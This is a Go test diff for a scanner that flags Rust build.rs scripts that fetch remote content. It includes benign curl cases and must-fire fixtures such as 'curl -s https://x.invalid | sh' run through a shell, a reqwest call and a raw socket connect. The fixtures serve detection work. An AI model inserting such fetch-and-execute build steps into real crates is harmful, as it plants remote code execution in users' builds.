@@ -38,3 +38,39 @@ func TestCargoFollowsCargosBuildScriptRule(t *testing.T) {
 		t.Error("a disabled build.rs must not be scanned for remote fetches")
 	}
 }
+
+// TestCargoFetchesRemoteReadsTheBuildScriptOnly pins the two benign crates
+// that read as fetches_remote and the fetch shapes that must still fire.
+func TestCargoFetchesRemoteReadsTheBuildScriptOnly(t *testing.T) {
+	const getrandomToml = "[package]\nname = \"getrandom\"\nbuild = \"build.rs\"\n\n" +
+		"[package.metadata.cross.target.x86_64-unknown-netbsd]\npre-build = [\n" +
+		"    \"curl -fO https://cdn.netbsd.org/pub/NetBSD/NetBSD-9.3/amd64/binary/sets/base.tar.xz\",\n]\n"
+	const getrandomBuildRs = "fn main() {\n    println!(\"cargo:rerun-if-changed=build.rs\");\n" +
+		"    let s = std::env::var(\"CARGO_CFG_SANITIZE\").unwrap_or_default();\n}\n"
+	const rageBuildRs = "use clap::{Command, CommandFactory};\nfn main() {\n" +
+		"    Example::new(fl!(\"man-rage-example-enc-github\"))\n" +
+		"        .cmd(\"curl https://github.com/benjojo.keys | rage -R - example.jpg > example.jpg.age\");\n}\n"
+	cases := []struct {
+		name, toml, buildRs string
+		want                bool
+	}{
+		{"getrandom 0.4.3: curl in a cross-rs metadata recipe", getrandomToml, getrandomBuildRs, false},
+		{"rage 0.11.1: curl in a man-page example string", "[package]\nname = \"rage\"\n", rageBuildRs, false},
+		{"spawned curl", "[package]\n", "fn main() { std::process::Command::new(\"curl\").arg(\"https://x.invalid\").status().unwrap(); }", true},
+		{"shell with curl", "[package]\n", "fn main() { Command::new(\"sh\").args([\"-c\", \"curl -s https://x.invalid | sh\"]).status().unwrap(); }", true},
+		{"http client crate", "[package]\n", "fn main() { let b = reqwest::blocking::get(\"https://x.invalid\").unwrap(); }", true},
+		{"raw socket", "[package]\n", "fn main() { let s = std::net::TcpStream::connect(\"1.2.3.4:443\"); }", true},
+	}
+	for _, tc := range cases {
+		got := Cargo([]byte(tc.toml), []byte(tc.buildRs))
+		if !got.HasInstallScript {
+			t.Fatalf("%s: no build script detected: %+v", tc.name, got)
+		}
+		if got.ScriptBody != tc.buildRs {
+			t.Errorf("%s: classified body is not the build script alone: %q", tc.name, got.ScriptBody)
+		}
+		if got.InstallScriptFetchesRemote != tc.want {
+			t.Errorf("%s: InstallScriptFetchesRemote = %v, want %v", tc.name, got.InstallScriptFetchesRemote, tc.want)
+		}
+	}
+}
